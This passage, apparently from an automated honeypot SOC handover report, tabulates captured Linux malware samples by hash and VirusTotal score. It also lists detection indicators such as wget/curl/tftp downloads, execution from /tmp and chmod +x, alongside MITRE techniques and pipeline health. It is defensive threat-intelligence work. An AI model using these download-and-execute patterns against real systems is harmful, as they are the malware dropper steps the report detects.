| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 80 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 73 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 44 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 42 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 42 |

---

## 🔕 False Positive Summary (126 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 126 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 126 cases |
| Tool 34  | Credential Extractor        | ✅ 261 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 60 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 126 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-09T18:47:06Z_
